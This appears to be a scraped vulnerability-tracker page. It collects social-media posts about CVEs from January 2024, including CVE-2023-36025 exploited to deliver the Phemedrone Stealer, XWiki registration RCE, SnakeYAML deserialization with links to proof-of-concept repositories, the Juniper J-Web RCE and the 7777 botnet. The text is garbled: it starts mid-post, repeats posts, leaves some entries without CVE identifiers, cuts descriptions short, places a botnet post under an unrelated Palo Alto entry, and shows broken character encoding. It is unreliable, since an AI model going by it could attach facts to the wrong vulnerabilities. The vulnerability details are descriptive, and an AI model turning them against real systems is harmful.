- https://www.samba.org/samba/security/CVE-2017-2619.html
- https://www.samba.org/samba/security/CVE-2021-20316.html
- https://www.samba.org/samba/security/CVE-2021-43566.html

Software is hard :)

##

Hackers Weaponize #Windows Flaw to Deploy Crypto-Siphoning Phemedrone Stealer

Note: This vulnerability (CVE-2023-36025) is now patched as of NOV 2023. So hopefully you've updated your Windows device(s) since November 2023 Patch Tuesday.

Also, this campaign is yet another that abuses Discord's CDN by hosting the malware. The #malware executes a control panel file in a way that bypasses #Defender SmartScreen. Paves the way for loading information stealer "Phemedrone"

##
VirusBulletin at 2024-01-15T09:22:31.061Z ##

Trend Micro's Peter Girnus, Aliakbar Zahravi & Simon Zuckerbraun delve into the Phemedrone Stealer campaign's exploitation of CVE-2023-36025, the Windows Defender SmartScreen Bypass vulnerability, for its defense evasion, & investigate the malware's payload. https://www.trendmicro.com/en_us/research/24/a/cve-2023-36025-exploited-for-defense-evasion-in-phemedrone-steal.html

##
simontsui at 2024-01-12T14:20:34.887Z ##

Trend Micro uncovered evidence pointing to an active exploitation of CVE-2023-36025 (8.8 high, exploited as a zero-day with public disclosure, disclosed by Microsoft in 14 November 2023 Patch Tuesday) to infect users with a previously unknown strain of the malware, Phemedrone Stealer. Phemedrone targets web browsers and data from cryptocurrency wallets and messaging apps such as Telegram, Steam, and Discord. It also takes screenshots and gathers system information regarding hardware, location, and operating system details. The stolen data is then sent to the attackers via Telegram or their C2 server. This open-source stealer is written in C# and actively maintained on GitHub and Telegram. TTPs and payload analysis described. IOC provided.
ðŸ”— https://www.trendmicro.com/en_us/research/24/a/cve-2023-36025-exploited-for-defense-evasion-in-phemedrone-steal.html

##
avoidthehack@infosec.exchange at 2024-01-17T19:06:17.000Z ##

Note: This vulnerability (CVE-2023-36025) is now patched as of NOV 2023. So hopefully you've updated your Windows device(s) since November 2023 Patch Tuesday.

Also, this campaign is yet another that abuses Discord's CDN by hosting the malware. The #malware executes a control panel file in a way that bypasses #Defender SmartScreen. Paves the way for loading information stealer "Phemedrone"

Phemedrone targets web browsers and data from cryptocurrency wallets and messaging apps such as Telegram, Steam, and Discord. It also takes screenshots and gathers system information regarding hardware, location, and operating system details. The stolen data is then sent to the attackers via Telegram or their C2 server. This open-source stealer is written in C# and actively maintained on GitHub and Telegram. TTPs and payload analysis described. IOC provided.
ðŸ”— https://www.trendmicro.com/en_us/research/24/a/cve-2023-36025-exploited-for-defense-evasion-in-phemedrone-steal.html

CVE-2024-21650
(10.0 CRITICAL)

EPSS: 0.58%

1 posts

### Impact XWiki is vulnerable to a remote code execution (RCE) attack through its user registration feature. This issue allows an attacker to execute arbitrary code by crafting malicious payloads in the "first name" or "last name" fields during user registration. This impacts all installations that have user registration enabled for guests. To reproduce, register with any username and password a

decio@infosec.exchange at 2024-01-10T08:29:31.000Z ##

Si vous avez un XWiki exposÃ© sur Internet avec le module d'inscription des utilisateurs activÃ©, il est important de rÃ©agir vite Ã  la vulnÃ©rabilitÃ© CVE-2024-21650.

Cette faille permet l'exÃ©cution de code Ã  distance par des attaquants.

##

CVE-2022-1471
(8.3 HIGH)

EPSS: 0.58%

1 posts

### Summary SnakeYaml's `Constructor` class, which inherits from `SafeConstructor`, allows any type be deserialized given the following line: new Yaml(new Constructor(TestDataClass.class)).load(yamlContent); Types do not have to match the types of properties in the target class. A `ConstructorException` is thrown, but only after a malicious payload is deserialized. ### Severity High, lack of ty

2 repos

https://github.com/1fabunicorn/SnakeYAML-CVE-2022-1471-POC

https://github.com/falconkei/snakeyaml_cve_poc

techbrunchfr@infosec.exchange at 2024-01-10T08:53:45.000Z ##

Panic!! At the YAML -
An overview of SnakeYAML deserialization vulnerabilities (CVE-2022-1471) - how it works, why it works, and what it affects : https://www.labs.greynoise.io/grimoire/2024-01-03-snakeyaml-deserialization/ #web #appsec

(9.8 CRITICAL)

EPSS: 0.50%

2 posts

XiongMai uc-httpd has directory traversal allowing the reading of arbitrary files via a "GET ../" HTTP request.

simontsui at 2024-01-18T15:13:57.426Z ##

VulnCheck wrote about 7777-Botnet with the following information:

  • 7777-Botnet remains active, and VulnCheck used co-located services to theorize the botnet is infecting TP-Link, Xiongmai, and Hikvision devices using CVE-2017-7577, CVE-2018-10088, CVE-2022-45460, CVE-2021-36260, and/or CVE-2022-24355.
  • The botnet also appears to infect other systems like MVPower, Zyxel NAS, and GitLab, although at a very low volume.
  • The botnet doesnâ€™t just start a service on port 7777. It also spins up a SOCKS5 server on port 11228.

ðŸ”— https://vulncheck.com/blog/ip-intel-7777-botnet

(9.8 CRITICAL)

EPSS: 0.24%

9 posts

An Out-of-bounds Write vulnerability in J-Web of Juniper Networks Junos OS on SRX Series and EX Series allows an unauthenticated, network-based attacker to cause a Denial of Service (DoS), or Remote Code Execution (RCE) and obtain root privileges on the device. This issue is caused by use of an insecure function allowing an attacker to overwrite arbitrary memory. This issue affects Juniper Netw

Juniper fixes critical RCE in its SRX firewalls and EX switches (CVE-2024-21591) https://www.helpnetsecurity.com/2024/01/15/cve-2024-21591/ #JuniperNetworks #securityupdate #vulnerability #enterprise #Don'tmiss #Hotstuff #firewall #News

campuscodi@mastodon.social at 2024-01-14T11:13:02.000Z ##

According to Censys, there are more than 11,500 Juniper devices with J-Web enabled on the internet, and possibly exposed to attacks via the new RCE (CVE-2024-21591)

https://censys.com/cve-2024-21591-juniper-j-web-oob-write-vulnerability/

##
jbhall56 at 2024-01-13T15:25:21.884Z ##

Found in the devices' J-Web configuration interfaces and tracked as CVE-2024-21591, this critical security flaw can also be exploited by unauthenticated threat actors to get root privileges or launch denial-of-service (DoS) attacks against unpatched devices. https://www.bleepingcomputer.com/news/security/juniper-warns-of-critical-rce-bug-in-its-firewalls-and-switches/#google_vignette

##
simontsui at 2024-01-12T19:24:13.210Z ##

Juniper security advisory: Junos OS: SRX Series and EX Series: CVE-2024-21591 (9.8 critical, disclosed 10 January 2024) preAuth Remote Code Execution vulnerability in J-web
"An Out-of-bounds Write vulnerability in J-Web of Juniper Networks Junos OS SRX Series and EX Series allows an unauthenticated, network-based attacker to cause a Denial of Service (DoS), or Remote Code Execution (RCE) and obtain root privileges on the device. This issue is caused by use of an insecure function allowing an attacker to overwrite arbitrary memory. Juniper SIRT is not aware of any malicious exploitation of this vulnerability."
ðŸ”— https://supportportal.juniper.net/s/article/2024-01-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Security-Vulnerability-in-J-web-allows-a-preAuth-Remote-Code-Execution-CVE-2024-21591?language=en_US

2 posts

A memory corruption vulnerability exists in Palo Alto Networks GlobalProtect portal and gateway interfaces that enables an unauthenticated network-based attacker to disrupt system processes and potentially execute arbitrary code with root privileges. An unauthenticated and remote attacker can execute arbitrary code by sending a crafted HTTP request that triggers the o

simontsui at 2024-01-18T15:13:57.426Z ##

VulnCheck wrote about 7777-Botnet with the following information:

  • 7777-Botnet remains active, and VulnCheck used co-located services to theorize the botnet is infecting TP-Link, Xiongmai, and Hikvision devices using CVE-2017-7577, CVE-2018-10088, CVE-2022-45460, CVE-2021-36260, and/or CVE-2022-24355.
  • The botnet also appears to infect other systems like MVPower, Zyxel NAS, and GitLab, although at a very low volume.
  • The botnet doesnâ€™t just start a service on port 7777. It also spins up a SOCKS5 server on port 11228.

##

CVE-2021-20316
(6.8 MEDIUM)

EPSS: 0.18%

2 posts

A flaw was found in the way Samba handled file/directory metadata. This flaw allows an authenticated attacker with permissions to read or modify share metadata, to perform this operation outside of the share.

jokeyrhyme@aus.social at 2024-01-10T23:31:22.000Z ##

@nzakas true

And it's still possible to have such TOCTOU races lurking elsewhere in a filesystem API, so it's probably not specific to predicates: https://blog.rust-lang.org/2022/01/20/cve-2022-21658.html

And races pop up in any software that has to perform filesystem operations:
- https://www.samba.org/samba/security/CVE-2017-2619.html
- https://www.samba.org/samba/security/CVE-2021-20316.html
- https://www.samba.org/samba/security/CVE-2021-43566.html

Software is hard :)

##
jokeyrhyme@aus.social at 2024-01-10T23:31:22.000Z ##

@nzakas true

And it's still possible to have such TOCTOU races lurking elsewhere in a filesystem API, so it's probably not specific to predicates: https://blog.rust-lang.org/2022/01/20/cve-2022-21658.html

And races pop up in any software that has to perform filesystem operations:
- https://www.samba.org/samba/security/CVE-2017-2619.html
- https://www.samba.org/samba/security/CVE-2021-20316.html
- https://www.samba.org/samba/security/CVE-2021-43566.html

CVE-2023-20867
(3.9 LOW)

EPSS: 0.16%

4 posts

A fully compromised ESXi host can force VMware Tools to fail to authenticate host-to-guest operations, impacting the confidentiality and integrity of the guest virtual machine.

simontsui at 2024-01-19T17:33:52.738Z ##

UNC3886 is a Chinese state-sponsored cyberespionage group that has targeted and exploited zero-day vulnerabilities in firewall and virtualization technologies, which do not support EDR solutions. UNC3886 has primarily targeted defense, technology, and telecommunication organizations located in the US and APJ regions. First public reporting on UNC3886 exploitation came from Mandiant on 29 September 2022.

UNC886 has been known to leverage the following vulnerabilities:

  • CVE-2022-41328 (7.1 high, disclosed 07 March 2023, in KEV) Fortinet FortiOS local directory traversal leads to arbitrary read/write
  • CVE-2023-20867 (3.9 low, disclosed 13 June 2023 by VMware, in KEV, VMware Tools Authentication Bypass)
  • CVE-2023-34048 (9.8 critical, disclosed 25 Octover 2023, under active exploitation, VMware vCenter Server Out-of-Bounds Write Vulnerability to RCE)

#UNC3886 #CVE202241328 #CVE202320867 #CVE202334048 #VMware #vCenter #RCE #FortiOS #KEV #China #cyberespionage #VMwaretools #APT

CVE-2023-42917
(8.8 HIGH)

EPSS: 0.14%

2 posts

A memory corruption vulnerability was addressed with improved locking. This issue is fixed in iOS 17.1.2 and iPadOS 17.1.2, macOS Sonoma 14.1.2, Safari 17.1.2. Processing web content may lead to arbitrary code execution. Apple is aware of a report that this issue may have been exploited against versions of iOS before iOS 16.7.1.

simontsui at 2024-01-22T19:10:40.967Z ##

Apple backported patches for previously identified zero-days CVE-2023-42916 (6.5 medium) and CVE-2023-42917 (8.8 high) in macOS Sonoma 14.1.2.* (edit: wrote the wrong product) These were initially disclosed in 30 November 2023 by Apple as exploited zero-days, and reported by ClÃ©ment Lecigne of Google's Threat Analysis Group. Google TAG has historically reported on zero-days developed and exploited by surveillance/spyware vendors.
ðŸ”— https://support.apple.com/en-us/HT214032

Google TAG has historically reported on zero-days developed and exploited by surveillance/spyware vendors.

CVE-2023-6927
(4.6 MEDIUM)

EPSS: 0.12%

2 posts

A flaw was found in Keycloak. This issue may allow an attacker to steal authorization codes or tokens from clients using a wildcard in the JARM response mode "form_post.jwt" which could be used to bypass the security patch implemented to address CVE-2023-6134.
